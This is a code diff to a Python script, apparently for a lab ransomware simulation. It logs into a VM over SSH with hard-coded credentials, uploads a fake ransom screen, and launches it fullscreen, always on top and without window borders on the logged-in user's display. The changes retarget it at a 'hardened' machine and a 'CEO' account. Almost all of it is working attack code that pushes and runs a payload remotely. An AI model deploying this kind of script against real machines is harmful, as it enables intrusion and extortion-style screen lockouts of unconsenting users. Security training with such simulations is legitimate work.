@@ -4,22 +4,22 @@ import paramiko
 import time
 
 # --- LAB CREDENTIALS ---
-TARGET_IP = "172.16.2.101"
-USERNAME = "kali"  # Replace with the actual Kali username
-PASSWORD = "kalipassword" # Replace with the actual Kali password
+TARGET_IP = "172.16.1.100" # The hardened Kali VM
+USERNAME = "CEO"
+PASSWORD = "CEOPass123!"
 
 def main():
-    print(f"[*] Preparing to deploy payload to {TARGET_IP}...")
+    print(f"[*] Preparing to deploy payload to hardened target {TARGET_IP}...")
 
     # We use Tkinter for the GUI because it is built into Python by default
     payload_script = """#!/usr/bin/env python3
 import tkinter as tk
 import sys
+import time
 
 def pay_ransom():
     lbl.config(text="Decrypting...")
     root.update()
-    import time
     for i in range(0, 101, 10):
         lbl.config(text=f"Decrypting your files... {i}%")
         root.update()
@@ -27,7 +27,9 @@ def pay_ransom():
     root.destroy()
 
 root = tk.Tk()
+# Force it to be always on top and fullscreen
 root.attributes('-fullscreen', True)
+root.attributes('-topmost', True) 
 root.configure(background='black')
 root.overrideredirect(True) # Removes window borders/close buttons
 
@@ -45,10 +47,11 @@ root.mainloop()
 """
 
     try:
-        # 1. Connect to the Kali VM via SSH
+        # 1. Connect to the Hardened Kali VM via SSH
         print("[*] Connecting via SSH...")
         ssh = paramiko.SSHClient()
         ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        
         ssh.connect(TARGET_IP, username=USERNAME, password=PASSWORD)
         
         # 2. Upload the payload script
@@ -56,34 +59,40 @@ root.mainloop()
         sftp = ssh.open_sftp()
         with sftp.file('/tmp/ransom_sim.py', 'w') as f:
             f.write(payload_script)
-        # Make it executable
         ssh.exec_command("chmod +x /tmp/ransom_sim.py")
         sftp.close()
 
         # 3. Execute the payload on the active display
         print("[*] Triggering GUI on active display...")
         
-        # We need to find the active user's display and XAUTHORITY
-        # This command finds the process for the desktop and uses its environment
+        # We need to find the active display (usually :0 or :1)
         find_display_cmd = "who | grep -m 1 '(:[0-9])' | awk '{print $2}'"
         stdin, stdout, stderr = ssh.exec_command(find_display_cmd)
         display = stdout.read().decode().strip()
         
         if not display:
-            print("[-] Could not find an active desktop session (are you logged in?).")
+            print("[-] Could not find an active desktop session (is the CEO user logged into the GUI?).")
             ssh.close()
             sys.exit(1)
             
         print(f"[+] Found active display: {display}")
 
-        # Run the script in the background targeting the correct display
-        # We use nohup and & to detach it so it stays open after SSH closes
-        exec_cmd = f"export DISPLAY={display}; export XAUTHORITY=/home/{USERNAME}/.Xauthority; nohup python3 /tmp/ransom_sim.py > /dev/null 2>&1 &"
+        # 4. Execute the payload
+        # Note: If the Kali VM is hardened, XAUTHORITY permissions might block this.
+        # We attempt to use the CEO user's XAUTHORITY.
+        exec_cmd = (
+            f"export DISPLAY={display}; "
+            f"export XAUTHORITY=/home/{USERNAME}/.Xauthority; "
+            f"nohup python3 /tmp/ransom_sim.py > /dev/null 2>&1 &"
+        )
+        
         ssh.exec_command(exec_cmd)
         
-        print("[+] Attack simulation launched. Check the Kali VM screen!")
+        print("[+] Attack simulation launched. Check the Hardened Kali VM screen!")
         ssh.close()
 
+    except paramiko.AuthenticationException:
+        print("[-] Authentication failed. Check your credentials.")
     except Exception as e:
         print(f"[-] Error: {e}")
         sys.exit(1)
